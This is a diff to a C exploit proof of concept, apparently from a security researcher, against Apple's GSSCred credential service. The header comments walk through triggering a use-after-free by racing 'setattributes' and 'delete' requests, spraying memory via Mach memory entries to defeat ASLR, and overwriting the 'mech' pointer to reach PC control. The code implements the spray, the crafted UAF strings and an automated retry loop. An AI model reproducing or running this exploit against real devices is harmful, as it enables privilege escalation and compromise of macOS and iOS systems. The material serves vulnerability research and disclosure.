@@ -126,6 +126,9 @@
  *  much experimentation, I eventually settled on triggering a use-after-free in the function
  *  do_SetAttrs() by invoking the do_Delete() function in parallel from another connection.
  *
+ *  Ihere may be better ways to exploit this bug, and it's certainly possible to improve exploit
+ *  reliability above what I've achieved here.
+ *
  *
  *  Creating a use-after-free
  *  -------------------------
@@ -211,7 +214,7 @@
  *
  *  Using these two functions, the race condition flow goes like this:
  *
- *  1. Create the credential we'll use for the UAF.
+ *  1. Create the credential we'll use for the UAF by sending a "create" request.
  *
  *  2. Send a "setattributes" request for the target credential with an attributes dictionary that
  *     will take a long time to deserialize. A pointer to the credential will be saved on the stack
@@ -235,7 +238,7 @@
  *  Corrupting the HeimCred
  *  -----------------------
  *
- *  Now, it's worth talking about how exactly we're going to overwrite the HeimCred object. Here's
+ *  Now it's worth talking about how exactly we're going to overwrite the HeimCred object. Here's
  *  the structure definition:
  *
  *  	struct HeimCred_s {
@@ -259,39 +262,113 @@
  *  It turns out the only way we can both allocate objects in an unbounded loop and pass the
  *  validateObject() check is by supplying an attributes dictionary containing an array of strings
  *  under the "kHEIMAttrBundleIdentifierACL" key. All other collections of objects will be rejected
- *  by validateObject(). Thus, the only object we can allocate in a loop is OS_xpc_string, the
- *  object type for an XPC string.
+ *  by validateObject(). Thus, the only objects we can allocate in a loop are OS_xpc_string, the
+ *  object type for an XPC string, and CFString, the CoreFoundation string type.
  *
- *  Fortunately for us, OS_xpc_string type is also allocated out of the 0x30 freelist. Here is its
- *  structure, as far as I can tell by reversing libxpc:
+ *  (This isn't quite true: we could, for example, play tricks with a serialized XPC dictionary
+ *  with colliding keys such that some objects we allocate don't end up in the final collection.
+ *  However, I tried to limit myself to the official XPC API and legal XPC objects. If you remove
+ *  this restriction, you can probably significantly improve the exploit. :) )
  *
- *  	struct OS_xpc_string {
- *  		objc_class *    isa;		// 00: 8 bytes
- *  		uint32_t        refcnt;		// 08: 4 bytes
- *  		uint32_t        xrefcnt;	// 0c: 4 bytes
- *  		uint32_t        flags;		// 10: 4 bytes
- *  		uint32_t        wire_size;	// 14: 4 bytes
- *  		uint64_t        length;		// 18: 8 bytes
- *  		char *          string;		// 20: 8 bytes
- *  	};					// Total: 0x28 bytes
+ *  Fortunately for us, both OS_xpc_string and CFString (for certain string lengths) are also
+ *  allocated out of the 0x30 freelist. It's possible to target either data structure for the
+ *  exploit, but I eventually settled on CFString because it seems easier to win that race window.
  *
- *  Most of these fields should be self-explanatory: "isa" is a pointer to the Objective-C class
- *  for OS_xpc_string, "wire_size" is the length of the serialized string, "length" is the length
- *  of the C string, and "string" is a pointer to the characters of the C string. Of these fields,
- *  we have partial control over the values of "wire_size" and "length", and we have nearly full
- *  control of the contents of "string".
+ *  Immutable CFString objects as allocated with their character data inline. This is what the
+ *  structure looks like for short strings:
  *
- *  For the use-after-free to be exploitable we want the fields of OS_xpc_string that we control to
- *  overlap those of HeimCred, such that creating the OS_xpc_string will corrupt the HeimCred
+ *  	struct CFString {
+ *  		CFRuntimeBase   runtime;	// 00: 0x10 bytes
+ *  		uint8_t         length;		// 10: 1 byte
+ *  		char            characters[1];	// 11: variable size
+ *  	};
+ *
+ *  Thus, if we use strings between 0x10 and 0x1f bytes long (including the null terminator), the
+ *  CFString objects will be allocated out of the 0x30 freelist, potentially allowing us to control
+ *  some fields of the freed HeimCred object.
+ *
+ *  For the use-after-free to be exploitable we want the part of the CFString that we control to
+ *  overlap the fields of HeimCred, such that creating the CFString will corrupt the HeimCred
  *  object in an interesting way. Looking back to the definition of the HeimCred structure, we can
- *  see that the "wire_size" field partially overlaps the last 4 bytes of "uuid", "length" overlaps
- *  "attributes", and "string" overlaps "mech". This means that if the HeimCred's memory is reused
- *  as an OS_xpc_string, we have partial control of the values of the HeimCred's "uuid" and
- *  "attributes" pointers and nearly full control of memory pointed to by the HeimCred's "mech"
- *  pointer. Since it would be difficult to generate a string long enough that its length is a
- *  valid pointer, the natural field to target for exploitation is "mech".
+ *  see that the "uuid", "attributes", and "mech" fields are all possibly controllable.
  *
- *  Here's the HeimMech structure:
+ *  However, all three of these fields are pointers, and userspace pointers on iOS usually contain
+ *  null bytes. Our CFString will end at the first null byte, so in order to remain in the 0x30
+ *  freelist the first null byte must occur at or after offset 0x20. This means the "uuid" and
+ *  "attributes" fields will have to be null-free, making them less promising exploit targets.
+ *  Hence "mech" is the natural choice. We will try to get the corrupted HeimCred's "mech" field to
+ *  point to memory whose contents we control.
+ *
+ *
+ *  Pointing to controlled data
+ *  ---------------------------
+ *
+ *  Where exactly will we make "mech" point?
+ *
+ *  We want "mech" to point to memory we control, but due to ASLR we don't know any addresses in
+ *  the GSSCred process. The traditional way to bypass ASLR when we don't know where our
+ *  allocations will be placed is using a heap spray. However, this presents two problems. First,
+ *  performing a traditional heap spray over XPC would be quite slow, since the kernel would need
+ *  to copy a huge amount of data from our address space into GSSCred's address space. Second, on
+ *  iOS the GSSCred process has a strict memory limit of around 6 megabytes, after which it is at
+ *  risk of being killed by Jetsam. 6 megabytes is nowhere near enough to perform an effective heap
+ *  spray, especially since our serialized attributes dictionary will already be allocating
+ *  thousands of strings to enlarge our race window.
+ *
+ *  Fortunately for us, libxpc contains an optimization that solves both problems: if we're sending
+ *  an XPC data object larger than 0x4000 bytes, libxpc will instead create a Mach memory entry
+ *  representing the data and send that to the target instead. Then, when the message is
+ *  deserialized in the recipient, libxpc will map the memory entry directly into the recipient's
+ *  address space by calling mach_vm_map(). The result is a fast, copy-free duplication of our
+ *  memory in the recipient process's address space. And because the physical pages are shared,
+ *  they don't count against GSSCred's memory limit. (See [1] for Ian Beer's triple_fetch exploit,
+ *  which is where I learned of this technique and where I derived some of the initial parameters
+ *  used here.)
+ *
+ *  Since libxpc calls mach_vm_map() with the VM_FLAGS_ANYWHERE flag, the kernel will choose the
+ *  address of the mapping. Presumably to minimize address space fragmentation, the kernel will
+ *  typically choose an address close to the program base. The program base is usually located at
+ *  an address like 0x000000010c65d000: somewhere above but close to 4GB (0x100000000), with the
+ *  exact address randomized by ASLR. The kernel might then place large VM_ALLOCATE objects at an
+ *  address like 0x0000000116097000: after the program, but still fairly close to 0x100000000. By
+ *  comparison, the MALLOC_TINY heap (which is where all of our objects will live) might start at
+ *  0x00007fb6f0400000 on macOS and 0x0000000107100000 on iOS.
+ *
+ *  Using a memory entry heap spray, we can fill a gigabyte or more of GSSCred's virtual memory
+ *  space with controlled data. (Choosing the exact parameters was a frustrating exercise in
+ *  guess-and-check, because for unknown reasons certain configurations of the heap spray work well
+ *  and others do not.) Because the sprayed data will follow closely behind the program base,
+ *  there's a good chance that addresses close to 0x0000000120000000 will contain our sprayed data.
+ *
+ *  This means we'll want our corrupted "mech" field to contain a pointer like 0x0000000120000000.
+ *  Once again, we need to address problems with null bytes.
+ *
+ *  Recall that the "mech" field is actually part of a CFString object that overwrites the freed
+ *  HeimCred pointer. Thus, the first null byte will terminate the string and all bytes after that
+ *  will retain whatever value they originally had in the HeimCred object.
+ *
+ *  Fortunately, because current macOS and iOS platforms are all little-endian, the pointer is laid
+ *  out least significant byte to most significant byte. If instead we use an address like
+ *  0x0000000120202020 (with all the null bytes at the start) for our controlled data, then the
+ *  lower 5 bytes of the address will be copied into the "mech" field, and the null terminator will
+ *  zero out the 6th. This leaves just the 2 high bytes of the "mech" field with whatever value
+ *  they had originally.
+ *
+ *  However, we know that the "mech" field was originally a heap pointer into the MALLOC_TINY heap,
+ *  and MALLOC_TINY pointers on both macOS and iOS start with 2 zero bytes. Thus, even though we
+ *  can only write to the lower 6 bytes, we know that the upper 2 bytes will always have the value
+ *  we want.
+ *
+ *  This means we have a way to get controlled data at a known address in the GSSCred process and
+ *  can make the "mech" field point to that data. Getting control of PC is simply a matter of
+ *  choosing the right data.
+ *
+ *
+ *  Controlling PC
+ *  --------------
+ *
+ *  We fully control the data pointed to by the "mech" field, so we can construct a fake HeimMech
+ *  object. Here's the HeimMech structure:
  *
  *  	struct HeimMech {
  *  		CFRuntimeBase           runtime;		// 00: 0x10 bytes
@@ -302,7 +379,7 @@
  *
  *  All of these fields are attractive targets. Controlling the isa pointer of an Objective-C class
  *  allows us to gain code execution if an Objective-C message is sent to the object (see Phrack,
- *  "Modern Objective-C Exploitation Techniques" [1]). And the last 2 fields are pointers to
+ *  "Modern Objective-C Exploitation Techniques" [2]). And the last 2 fields are pointers to
  *  callback functions, which is an even easier route to PC control (if we can get them called).
  *
  *  To determine which field or fields are of interest, we need to look at how the corrupted
@@ -332,70 +409,17 @@
  *  		notifyChangedCaches();
  *  	}
  *
- *  Since the corrupted HeimCred's "mech" field will never be NULL, the assertion will pass. Next,
- *  the "mech" field will be dereferenced to read the "name" pointer, which is passed to
- *  CFDictionaryGetValue(). This is perfect: we control the memory pointed to by "mech", so we can
- *  control the value of the "name" pointer. If we can ensure that "name" points to a fake
- *  Objective-C object, then we're on our way to code execution.
- *
- *
- *  Pointing to controlled data
- *  ---------------------------
- *
- *  At this point it's worth taking some time to talk about where exactly "name" will point.
- *
- *  We want "name" to point to memory we control, but due to ASLR we don't know any addresses in
- *  the GSSCred process. The traditional way to bypass ASLR when we don't know where our
- *  allocations will be placed is using a heap spray. However, performing a traditional heap spray
- *  over XPC would be quite slow, since the kernel would need to copy a huge amount of data from
- *  our address space to GSSCred's address space. Fortunately for us, libxpc contains an
- *  optimization: if we're sending an XPC data object larger than 0x4000 bytes, libxpc will instead
- *  create a Mach memory entry representing the data and send that to the target instead. Then,
- *  when the message is deserialized in the recipient, libxpc will map the memory entry directly
- *  into the recipient's address space by calling mach_vm_map(). The result is a fast, copy-free
- *  duplication of our memory in the recipient process's address space. (See [2] for Ian Beer's
- *  triple_fetch exploit, which is where I learned of this technique and the parameters used here.)
- *
- *  Since mach_vm_map() is called with the VM_FLAGS_ANYWHERE flag, the kernel will choose the
- *  address of the mapping. Presumably to minimize address space fragmentation, the kernel will
- *  typically choose an address close to the program base. The program base is usually located at
- *  an address like 0x000000010c65d000: somewhere above but close to 4GB (0x100000000), with the
- *  exact address randomized by ASLR. The kernel might then place large VM_ALLOCATE objects at an
- *  address like 0x0000000116097000: after the program, but still fairly close to 0x100000000. By
- *  comparison, the MALLOC_TINY heap (which is where all of our objects will live) might start at
- *  0x00007fb6f0400000 on macOS and 0x0000000107100000 on iOS.
- *
- *  Using a memory entry heap spray, we can fill 1GB of GSSCred's virtual memory space with
- *  controlled data. Because the sprayed data will follow closely behind the program base, there's
- *  a good chance that addresses close to 0x0000000120000000 will contain our sprayed data.
- *
- *  This means we'll want our corrupted "name" field to contain a pointer like 0x0000000120000000.
- *  However, there's a problem: the fake HeimMech object from which the "name" field will be read
- *  was allocated as the string contents of an OS_xpc_string object. During deserialization libxpc
- *  allocates this data using strdup() on the original contents of the XPC message. Thus, we will
- *  only control the contents of the fake HeimMech object up to the first null byte, and clearly
- *  the address 0x0000000120000000, which we want as the HeimMech's "name" field, is full of null
- *  bytes.
- *
- *  Luckily, this restriction isn't as damaging as it at first seems. Modern macOS and iOS
- *  platforms are all little-endian, meaning the pointer is laid out in memory least significant
- *  byte to most significant byte. If instead we use an address like 0x0000000120202020 (with all
- *  the null bytes at the start) for our controlled data, then the low 5 bytes of the address will
- *  be copied into the "name" field, and the null terminator will zero out the 6th. This leaves
- *  just the 2 high bytes of the "name" field with whatever heap garbage they had originally.
- *
- *  It turns out that in practice, those uninitialized heap bytes are usually zero, meaning that we
- *  usually end up with exactly the value we want in the "name" field of our fake HeimMech. :)
- *
- *
- *  Code execution
- *  --------------
+ *  Since we will make the corrupted HeimCred's "mech" field point to our heap spray data it will
+ *  never be NULL, so the assertion will pass. Next, the "mech" field will be dereferenced to read
+ *  the "name" pointer, which is passed to CFDictionaryGetValue(). This is perfect: we can make our
+ *  fake HeimMech's "name" pointer also point into the heap spray data. We will construct a fake
+ *  Objective-C object such that when CFDictionaryGetValue() sends a message to it we end up with
+ *  PC control.
  *
  *  So, to summarize our progress so far, we can corrupt the HeimCred object such that its "mech"
- *  pointer points to a fake HeimMech object, and the HeimMech object's "name" field points to
- *  sprayed data whose contents we control. And we're about to enter a call to
+ *  pointer points to a fake HeimMech object, and the HeimMech's "name" field points to another
+ *  fake object whose contents we fully control. And we're about to enter a call to
  *  CFDictionaryGetValue() with our "name" pointer as the second parameter.
- *
  *
  *  TODO
  *
@@ -411,41 +435,90 @@
  *  when GSSCred sent back a reply. Thus, I figured that a 10 millisecond race window for the
  *  "delete" request would be plenty. Further experiments showed that in order to make
  *  deserializing an array of strings take 10 milliseconds, I needed the array to contain about
- *  26000 strings.
+ *  26000 strings. However, using this many strings proved problematic on iOS due to the Jetsam
+ *  limits, so I eventually scaled back to 10000 strings.
  *
  *
  * References
  * ------------------------------------------------------------------------------------------------
  *
- *  [1]: http://phrack.org/issues/69/9.html
- *  [2]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1247
- *
- *
- * Notes
- * ------------------------------------------------------------------------------------------------
- *
- *  - The overhead of libxpc is messing with the timing of the exploit. My race window is happening
- *    while xpc_connection_send_message_with_reply() is returning. I'll need to implement my own
- *    libxpc-compatible XPC client to frontend all of the serialization work.
- *
- *  - The race window on my iPhone 6s is actually much different than I imagined: From about 1ms to
- *    somewhere around 20ms we get OS_xpc_string reuse, from about 33ms to 48ms we get CFString
- *    reuse, with a possible sweet spot around 38ms. (The middle area is fuzzy, I wasn't paying
- *    close attention.) CFString reuse is comparably reliable to OS_xpc_string (perhaps even
- *    better), but it's harder to hit that window. I still don't know why my iPhone 8 was
- *    experiencing CFString reuse at 6ms delay.
+ *  [1]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1247
+ *  [2]: http://phrack.org/issues/69/9.html
  *
  */
 
 #include "gsscred_race.h"
 
 #include <assert.h>
+#include <CoreFoundation/CoreFoundation.h>
+#include <mach/mach.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <xpc/xpc.h>
 
-#include <CoreFoundation/CoreFoundation.h>
+#if __x86_64__
+
+// ---- Header files not available on iOS ---------------------------------------------------------
+
+#include <mach/mach_vm.h>
+
+#else /* __x86_64__ */
+
+// If we're not on x86_64, then we probably don't have access to the above headers. The following
+// definitions are copied directly from the macOS header files.
+
+// ---- Definitions from mach/mach_vm.h -----------------------------------------------------------
+
+extern
+kern_return_t mach_vm_allocate
+(
+	vm_map_t target,
+	mach_vm_address_t *address,
+	mach_vm_size_t size,
+	int flags
+);
+
+extern
+kern_return_t mach_vm_deallocate
+(
+	vm_map_t target,
+	mach_vm_address_t address,
+	mach_vm_size_t size
+);
+
+extern
+kern_return_t mach_vm_remap
+(
+	vm_map_t target_task,
+	mach_vm_address_t *target_address,
+	mach_vm_size_t size,
+	mach_vm_offset_t mask,
+	int flags,
+	vm_map_t src_task,
+	mach_vm_address_t src_address,
+	boolean_t copy,
+	vm_prot_t *cur_protection,
+	vm_prot_t *max_protection,
+	vm_inherit_t inheritance
+);
+
+#endif /* __x86_64__ */
+
+// The following definitions are not available in the header files for any platform. They are
+// copied from the corresponding header files available at opensource.apple.com.
+
+// ---- Definitions from libdispatch private/data_private.h ---------------------------------------
+
+/*!
+ * @const DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE
+ * @discussion The destructor for dispatch data objects that have been created
+ * from buffers that require deallocation using vm_deallocate.
+ */
+#define DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE \
+		(_dispatch_data_destructor_vm_deallocate)
+API_AVAILABLE(macos(10.8), ios(6.0)) DISPATCH_LINUX_UNAVAILABLE()
+DISPATCH_DATA_DESTRUCTOR_TYPE_DECL(vm_deallocate);
 
 // ---- Debugging macros --------------------------------------------------------------------------
 
@@ -470,11 +543,6 @@
 #define WARNING(fmt, ...)		printf("Warning: "fmt"\n", ##__VA_ARGS__)
 #define ERROR(fmt, ...)			printf("Error: "fmt"\n", ##__VA_ARGS__)
 
-// ---- Utility functions and macros --------------------------------------------------------------
-
-#define min(a,b)	((a) < (b) ? (a) : (b))
-#define max(a,b)	((a) > (b) ? (a) : (b))
-
 // ---- Some definitions from Heimdal-520 ---------------------------------------------------------
 
 static const char *kHEIMObjectType              = "kHEIMObjectType";
@@ -488,23 +556,30 @@ static const char *kHEIMAttrBundleIdentifierACL = "kHEIMAttrBundleIdentifierACL"
 
 static const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";
 
-static const size_t UAF_STRING_SIZE               = 0x30;
-static const size_t UAF_STRING_COUNT              = 26000;	// 10 ms
-static const size_t SETATTRIBUTES_TO_DELETE_DELAY = 6000;	// 6 ms
-static const size_t POST_CREATE_CREDENTIAL_DELAY  = 10000;	// 10 ms
-static const size_t RETRY_RACE_DELAY              = 300000;	// 300 ms
+static const size_t   UAF_STRING_SIZE               = 0x20;
+static const size_t   UAF_STRING_COUNT              = 10000;
+static const unsigned POST_CREATE_CREDENTIAL_DELAY  = 10000;	// 10 ms
+static const unsigned RETRY_RACE_DELAY              = 200000;	// 200 ms
+
+static const unsigned INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US   = 0;
+static const unsigned SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US = 200;
+
+static const size_t   MAX_TRIES = 300;
 
 // ---- Parameters for building the controlled page -----------------------------------------------
 
 static const size_t    DATA_SIZE                = 0x4000;
-static const size_t    DATA_COUNT_PER_SPRAY     = 0x100;
-//static const size_t    DATA_SPRAY_COUNT         = 0xc0; // TODO
+static const size_t    DATA_COUNT_PER_BLOCK     = 0x10;
+static const size_t    DATA_BLOCKS_PER_MAPPING  = 0x100;
+static const size_t    DATA_MAPPING_COUNT       = 10;
 static const uintptr_t DATA_ADDRESS             = 0x0000000120204000;
-static const size_t    DATA_OFFSET__name_object = 0x20;
+
+static const size_t    DATA_OFFSET__HeimMech_object = 0x20;
 
 // ---- Structure offsets -------------------------------------------------------------------------
 
-static const size_t OFFSET__HeimMech__name = 0x10;
+static const size_t OFFSET__CFString__characters = 0x11;
+static const size_t OFFSET__HeimCred__mech       = 0x20;
 
 // ---- Exploit implementation --------------------------------------------------------------------
 
@@ -516,14 +591,17 @@ struct gsscred_race_state {
 	xpc_connection_t delete_connection;
 	// The create request, which will create the credential.
 	xpc_object_t create_request;
-	// The setattributes request. The uuid parameter will need to be changed each attempt.
+	// The setattributes request, which will trigger the UAF.
 	xpc_object_t setattributes_request;
-	// The delete request, which will delete all the children followed by the parent.
+	// The delete request, which will delete the credential.
 	xpc_object_t delete_request;
 	// A semaphore that will be signalled when we receive the setattributes reply.
 	dispatch_semaphore_t setattributes_reply_done;
 	// Whether either connection has been interrupted, indicating a crash.
 	bool connection_interrupted;
+	// The current delay between sending the setattributes request and sending the delete
+	// request.
+	unsigned setattributes_to_delete_delay;
 };
 
 // Generate the string that will be repeatedly deserialized and allocated by GSSCred. If all goes
@@ -534,41 +612,104 @@ struct gsscred_race_state {
 // DATA_ADDRESS.
 static void
 gsscred_race_generate_uaf_string(char *uaf_string) {
-	uint8_t *fake_HeimMech = (uint8_t *)uaf_string;
-	// In lieu of the traditional heap padding, we'll use this special value, which has the
-	// interesting property that it is both a valid CFString pointer and a valid UTF-8 string.
-	// :)
-	// NOTE: This doesn't play well when targeting CFString for the UAF rather than
-	// OS_xpc_string. Switch back to A's if targeting CFString.
-	for (size_t i = 0; i < UAF_STRING_SIZE / sizeof(uint64_t); i++) {
-		((uint64_t *)fake_HeimMech)[i] = 0xa0c2410142042417;
-	}
-	uint8_t *name_field = fake_HeimMech + OFFSET__HeimMech__name;
-	*(uint64_t *)name_field = DATA_ADDRESS + DATA_OFFSET__name_object;
+	memset(uaf_string, 'A', UAF_STRING_SIZE);
+	uint8_t *fake_HeimCred = (uint8_t *)uaf_string - OFFSET__CFString__characters;
+	uint8_t *HeimCred_mech = fake_HeimCred + OFFSET__HeimCred__mech;
+	*(uint64_t *)HeimCred_mech = DATA_ADDRESS + DATA_OFFSET__HeimMech_object;
 }
 
 // TODO
 static void
 gsscred_race_generate_spray_data(uint8_t *data) {
 	// TODO
-	memset(data, 0x41, DATA_SIZE);
+	memset(data, 0x51, DATA_SIZE);
 }
 
-// TODO
+// Generate a large mapping consisting of many copies of the given data. Note that changes to the
+// beginning of the mapping will be reflected to other parts of the mapping, but possibly only if
+// the other parts of the mapping are not accessed directly.
+static void *
+map_replicate(const void *data, size_t data_size, size_t count) {
+	// Generate the large mapping.
+	size_t mapping_size = data_size * count;
+	mach_vm_address_t mapping;
+	kern_return_t kr = mach_vm_allocate(mach_task_self(), &mapping, mapping_size,
+			VM_FLAGS_ANYWHERE);
+	if (kr != KERN_SUCCESS) {
+		ERROR("%s(%zx): %x", "mach_vm_allocate", mapping_size, kr);
+		goto fail_0;
+	}
+	// Re-allocate the first segment of this mapping for the master slice. Not sure if this is
+	// necessary.
+	kr = mach_vm_allocate(mach_task_self(), &mapping, data_size,
+			VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
+	if (kr != KERN_SUCCESS) {
+		ERROR("%s(%zx, %s): %x", "mach_vm_allocate", data_size,
+				"VM_FLAGS_OVERWRITE", kr);
+		goto fail_1;
+	}
+	// Copy in the data into the master slice.
+	memcpy((void *)mapping, data, data_size);
+	// Now re-map the master slice onto the other slices.
+	for (size_t i = 1; i < count; i++) {
+		mach_vm_address_t remap_address = mapping + i * data_size;
+		vm_prot_t current_protection, max_protection;
+		kr = mach_vm_remap(mach_task_self(),
+				&remap_address,
+				data_size,
+				0,
+				VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+				mach_task_self(),
+				mapping,
+				FALSE,
+				&current_protection,
+				&max_protection,
+				VM_INHERIT_NONE);
+		if (kr != KERN_SUCCESS) {
+			ERROR("%s(%s): %x", "mach_vm_remap", "VM_FLAGS_OVERWRITE", kr);
+			goto fail_1;
+		}
+	}
+	// All set! We should have one big memory object now.
+	return (void *)mapping;
+fail_1:
+	mach_vm_deallocate(mach_task_self(), mapping, mapping_size);
+fail_0:
+	return NULL;
+}
+
+// Build the XPC spray data object that will (hopefully) get controlled data allocated at a fixed
+// address in GSSCred.
 static xpc_object_t
 gsscred_race_build_spray_data_object() {
-	uint8_t data[DATA_SIZE];
-	gsscred_race_generate_spray_data(data);
-	size_t spray_data_size = DATA_SIZE * DATA_COUNT_PER_SPRAY;
-	uint8_t *spray_data = malloc(spray_data_size);
-	assert(spray_data != NULL);
-	for (size_t i = 0; i < DATA_COUNT_PER_SPRAY; i++) {
-		memcpy(spray_data + i * DATA_SIZE, data, DATA_SIZE);
+	// First generate the data we want to spray.
+	size_t block_size = DATA_SIZE * DATA_COUNT_PER_BLOCK;
+	uint8_t *data_block = malloc(block_size);
+	assert(data_block != NULL);
+	gsscred_race_generate_spray_data(data_block);
+	// Repeat the data several times to create a bigger block of data. This helps with the
+	// remapping process.
+	for (size_t i = 1; i < DATA_COUNT_PER_BLOCK; i++) {
+		memcpy(data_block + i * DATA_SIZE, data_block, DATA_SIZE);
 	}
-	xpc_object_t xpc_spray_data = xpc_data_create(spray_data, spray_data_size);
-	assert(xpc_spray_data != NULL);
-	free(spray_data);
-	return xpc_spray_data;
+	// Now create an even larger copy of that data block by remapping it several times
+	// consecutively. This object will take up the same amount of memory as the single data
+	// block, despite covering a large virtual address range.
+	size_t map_size = block_size * DATA_BLOCKS_PER_MAPPING;
+	void *data_map = map_replicate(data_block, block_size, DATA_BLOCKS_PER_MAPPING);
+	assert(data_map != NULL);
+	free(data_block);
+	// Wrap the data mapping in a dispatch_data_t so that it isn't copied, then wrap that in an
+	// XPC data object. We leverage the internal DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE data
+	// destructor so that dispatch_data_make_memory_entry() doesn't try to remap the data
+	// (which would cause us to be killed by Jetsam).
+	dispatch_data_t dispatch_data = dispatch_data_create(data_map, map_size,
+			NULL, DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE);
+	assert(dispatch_data != NULL);
+	xpc_object_t xpc_data = xpc_data_create_with_dispatch_data(dispatch_data);
+	dispatch_release(dispatch_data);
+	assert(xpc_data != NULL);
+	return xpc_data;
 }
 
 // Build the request objects for the GSSCred race. We do this all upfront.
@@ -626,26 +767,25 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, uaf_string);
 	}
 	xpc_dictionary_set_value(new_attributes, kHEIMAttrBundleIdentifierACL, new_acl);
+	for (size_t i = 0; i < DATA_MAPPING_COUNT; i++) {
+		char key[20];
+		snprintf(key, sizeof(key), "data_%zu", i);
+		xpc_dictionary_set_value(setattributes_request, key, spray_data_object);
+	}
 	xpc_dictionary_set_string(setattributes_request, "command",    "setattributes");
 	xpc_dictionary_set_uuid(  setattributes_request, "uuid",       uuid);
 	xpc_dictionary_set_value( setattributes_request, "attributes", new_attributes);
-	// TODO
-	//for (size_t i = 0; i < DATA_SPRAY_COUNT; i++) {
-	//	char key[20];
-	//	snprintf(key, sizeof(key), "data_%zu", i);
-	//	xpc_dictionary_set_value(setattributes_request, key, spray_data_object);
-	//}
 	xpc_release(new_acl);
 	xpc_release(new_attributes);
 	xpc_release(spray_data_object);
 	state->setattributes_request = setattributes_request;
 
-	// Build the delete request for the parent.
+	// Build the delete request for the credential.
 	// {
 	//     "command": "delete",
 	//     "query":   {
 	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
-	//         "kHEIMAttrUUID":   ab 0000,
+	//         "kHEIMAttrUUID":   ab,
 	//     },
 	// }
 	xpc_object_t delete_query   = xpc_dictionary_create(NULL, NULL, 0);
@@ -766,8 +906,6 @@ gsscred_race_setattributes_async(struct gsscred_race_state *state) {
 		char *desc = xpc_copy_description(reply);
 		DEBUG_TRACE("setattributes reply: %s", desc);
 		free(desc);
-#endif
-#if DEBUG
 		assert(xpc_dictionary_get_value(reply, "error") == NULL);
 #endif
 	});
@@ -808,9 +946,12 @@ gsscred_race_run() {
 	gsscred_race_delete_credential_sync(&state);
 	sleep(1);
 
+	// Initialize the delay between setattributes and delete.
+	state.setattributes_to_delete_delay = INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US;
+
 	// Loop until we win.
-	const size_t MAX_TRIES = 4000;
 	for (size_t try = 1;; try++) {
+		DEBUG_TRACE("Trying %u", state.setattributes_to_delete_delay);
 
 		// Create the credential synchronously.
 		bool ok = gsscred_race_create_credential_sync(&state);
@@ -831,7 +972,7 @@ gsscred_race_run() {
 
 		// Sleep for awhile, until there's a good chance that the delete request will
 		// arrive in the middle of the race window.
-		usleep(SETATTRIBUTES_TO_DELETE_DELAY);
+		usleep(state.setattributes_to_delete_delay);
 
 		// Send the delete message synchronously.
 		gsscred_race_delete_credential_sync(&state);
@@ -854,6 +995,9 @@ gsscred_race_run() {
 			ERROR("Could not win the race after %zu tries", try);
 			break;
 		}
+
+		// Increase the delay.
+		state.setattributes_to_delete_delay += SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US;
 
 		// If we didn't get a Connection Interrupted error, then GSSCred is still running.
 		// Sleep for awhile to let GSSCred settle down, then try again.
